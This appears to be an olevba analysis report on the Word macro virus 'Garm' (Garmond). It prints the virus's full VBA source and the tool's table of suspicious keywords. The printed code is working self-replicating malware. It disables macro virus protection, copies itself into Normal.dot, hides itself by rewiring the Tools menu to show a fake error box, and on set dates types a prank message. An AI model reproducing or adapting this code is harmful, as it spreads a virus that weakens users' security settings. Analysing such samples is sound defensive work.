olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Garm-c258f37137a2c646f6d72e1c4f243409b502d84e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Garm-c258f37137a2c646f6d72e1c4f243409b502d84e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Garmond.bas 
in file: Virus.MSWord.Garm-c258f37137a2c646f6d72e1c4f243409b502d84e - OLE stream: 'Macros/VBA/Garmond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Long live John Garmond
' Created by NAENBGOURSG
' Greece, x-mas 1998

Option Explicit

Public strTexts(11) As String

Function AlreadyInitialized()

    Dim varVbc As Variant
    
    For Each varVbc In ActiveDocument.VBProject.VBComponents
        If varVbc.Name = "Garmond" Then
            AlreadyInitialized = True
            Exit Function
        End If
    Next varVbc

    AlreadyInitialized = False

End Function

Sub AutoNew()

    Dim blCommunicated As Integer
    Dim strInfDate As String
        
    On Error Resume Next
    
    Options.VirusProtection = False
    
    Open "c:\grmd.cfg" For Input As #1
        
    If Err = 53 Then
        Open "c:\grmd.cfg" For Output As #1
        Print #1, 0
        Print #1, Now
        Close
        Exit Sub
    Else
        Input #1, blCommunicated
        Input #1, strInfDate
        Close
    End If
   
    If blCommunicated Then
        Application.OrganizerDelete Source:="normal.dot", _
        Name:="Garmond", Object:=wdOrganizerObjectProjectItems
        Exit Sub
    End If
    
    NormalTemplate.VBProject.VBComponents("Garmond").Export _
        NormalTemplate.Path & "/~wrl2561.tmp"
    ActiveDocument.VBProject.VBComponents.Import _
        NormalTemplate.Path & "/~wrl2561.tmp"
    Kill NormalTemplate.Path & "/~wrl2561.tmp"
   
    Randomize
    InitStealth
    
    If Month(Now) = 9 And Day(Now) = 27 Then
        SetStrings
        Application.OnTime 0.6, "Communicate"
    End If

End Sub

Sub AutoOpen()

    Dim blCommunicated As Integer
    Dim strInfDate As String
        
    On Error Resume Next
    
    Options.VirusProtection = False
    
    Application.OrganizerCopy _
        Source:=Application.ActiveDocument.FullName, _
        Destination:="Normal.dot", Name:="Garmond", Object:= _
        wdOrganizerObjectProjectItems
    
    Open "c:\grmd.cfg" For Input As #1
    
    If Err = 53 Then
        Open "c:\grmd.cfg" For Output As #1
        Print #1, 0
        Print #1, Now
        Close
        Exit Sub
    Else
        Input #1, blCommunicated
        Input #1, strInfDate
        Close
    End If
    
    If blCommunicated Then
        Application.OrganizerDelete Source:="normal.dot", _
        Name:="Garmond", Object:=wdOrganizerObjectProjectItems
        Exit Sub
    End If
    
    Randomize
    InitStealth
    
    If Not AlreadyInitialized Then
        NormalTemplate.VBProject.VBComponents("Garmond").Export _
            NormalTemplate.Path & "/~wrl2561.tmp"
        ActiveDocument.VBProject.VBComponents.Import _
            NormalTemplate.Path & "/~wrl2561.tmp"
        Kill NormalTemplate.Path & "/~wrl2561.tmp"
    End If
    
    If Month(Now) Mod 3 = 0 And Day(Now) = 28 Then
        SetStrings
        Application.OnTime 0.6, "Communicate"
    End If

End Sub

Sub Communicate()
Attribute Communicate.VB_Description = "Makro aufgezeichnet am 14.09.99 von Bernd Liebermann"
Attribute Communicate.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Makro1"

On Error Resume Next

Static intIndex As Integer
Dim intDelay As Long, i As Long, j As Long, tmp As Double

For i = 1 To Len(strTexts(intIndex))
    Selection.TypeText Mid(strTexts(intIndex), i, 1)
    intDelay = Int(25000 * Rnd)
    j = 0
    Do
        j = j + 1
        tmp = 2 ^ 0.5
    Loop Until j = intDelay
Next i

intIndex = intIndex + 1
Select Case intIndex
Case 1
    Application.OnTime Now + TimeValue("00:00:04"), "Communicate"
Case 2
    Application.OnTime Now + TimeValue("00:00:08"), "Communicate"
Case 3
    Application.OnTime Now + TimeValue("00:00:09"), "Communicate"
Case 4
    Application.OnTime Now + TimeValue("00:00:07"), "Communicate"
Case 5
    Application.OnTime Now + TimeValue("00:00:11"), "Communicate"
Case 6
    Application.OnTime Now + TimeValue("00:00:06"), "Communicate"
Case 7
    Application.OnTime Now + TimeValue("00:00:13"), "Communicate"
Case 8
    Application.OnTime Now + TimeValue("00:00:12"), "Communicate"
Case 9
    Application.OnTime Now + TimeValue("00:00:14"), "Communicate"
Case 10
    Application.OnTime Now + TimeValue("00:00:24"), "Communicate"
Case 11
    Application.OnTime Now + TimeValue("00:00:37"), "Communicate"
Case Else
    intIndex = 0
    For i = 0 To 11
        strTexts(i) = ""
    Next i
    Open "c:\grmd.cfg" For Output As #1
    Seek #1, 1
    Print #1, -1
    Close
    Application.OrganizerDelete NormalTemplate.FullName, "Garmond", _
        wdOrganizerObjectProjectItems
    Application.OrganizerDelete ThisDocument.FullName, "Garmond", _
        wdOrganizerObjectProjectItems
End Select

End Sub

Sub GenerateRndChars(ByVal intStrIndex As Integer)

    Dim intCountRndChars As Integer, intRndChar As Integer
    Dim j As Integer
    
    intCountRndChars = Int(Rnd * 70)

    For j = 1 To intCountRndChars
        intRndChar = Int(Rnd * 255) + 1
        If intRndChar = 13 Then GoTo GenerateRndChars_Next_j
        strTexts(intStrIndex) = strTexts(intStrIndex) & Chr(intRndChar)
GenerateRndChars_Next_j:
    Next j
                
End Sub

Sub ShowMsgBox()
    
    Dim intRndNumber As Integer
    
    intRndNumber = Int(Rnd * 10)
    
    If intRndNumber = 5 Then
        MsgBox "Internal Error #4259. Please contact the Microsoft " _
            & "Word Developer Team.", vbOKOnly + vbCritical, _
            "Microsoft Word"
    End If

End Sub

Sub SetStrings()

    Randomize
    GenerateRndChars 0
    strTexts(0) = strTexts(0) & "hello, can anybody hear me? my na"
    
    GenerateRndChars 1
    strTexts(1) = strTexts(1) & "me is john garmond. i got "
    strTexts(1) = strTexts(1) & "displaced in june 1996 on a boat "
    strTexts(1) = strTexts(1) & "trip near little abaco isl"
    
    GenerateRndChars 2
    strTexts(2) = strTexts(2) & "and. this is now almost 9 years ago "
    strTexts(2) = strTexts(2) & "and i can tell you THEY got me. i "
    strTexts(2) = strTexts(2) & "never believed in silly stuff like "
    
    GenerateRndChars 3
    strTexts(3) = strTexts(3) & "hat, but i'm forced to in very delic"
    strTexts(3) = strTexts(3) & "ate way. i'm not sure, if anybody is "
    strTexts(3) = strTexts(3) & "receiving this message, thi"
    
    GenerateRndChars 4
    strTexts(4) = strTexts(4) & "s is the first time that i got "
    strTexts(4) = strTexts(4) & "acces to their communicaters room. "
    strTexts(4) = strTexts(4) & "i do not have much time "
    
    GenerateRndChars 5
    strTexts(5) = strTexts(5) & "so i can't tell you much about our "
    strTexts(5) = strTexts(5) & "situation, but know: we're many, "
    strTexts(5) = strTexts(5) & "we're well up but we are prison"
    
    GenerateRndChars 6
    strTexts(6) = strTexts(6) & "ers. if you receive this message "
    strTexts(6) = strTexts(6) & "plese tell the nasa, the nsa and all"
    strTexts(6) = strTexts(6) & "other relevant organizations, taht"
    
    GenerateRndChars 7
    strTexts(7) = strTexts(7) & "they're here. we don't knoe their "
    strTexts(7) = strTexts(7) & "intentions, but they're grabbing "
    strTexts(7) = strTexts(7) & "more and more hum"
    
    GenerateRndChars 8
    strTexts(8) = strTexts(8) & "ans from earth. we need you're help "
    strTexts(8) = strTexts(8) & "!!! and you will also need help, "
    strTexts(8) = strTexts(8) & "mankind definetley relies on prot"
    
    GenerateRndChars 9
    GenerateRndChars 10
    GenerateRndChars 11
 
End Sub

Sub InitStealth()

    Dim c As Variant

    'On Error Resume Next

    For Each c In CommandBars("Tools").Controls
        If c.ID = 30017 Then
            c.Controls(1).OnAction = "ShowMsgBox"
            c.Controls(2).OnAction = ""
            c.Controls(3).OnAction = "ShowMsgBox"
'        ElseIf c.ID = 797 Then
'            c.OnAction = "ShowMsgBox"
'        ElseIf c.ID = 751 Then
'            c.OnAction = "ShowMsgBox"
        End If
    Next c
    
    CustomizationContext = NormalTemplate
    KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyF11, wdKeyAlt), _
        KeyCategory:=wdKeyCategoryCommand, Command:="FileNew"
    KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyNumeric0, wdKeyControl, _
        wdKeyAlt), KeyCategory:=wdKeyCategoryCommand, _
        Command:="SpookIsOver"

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

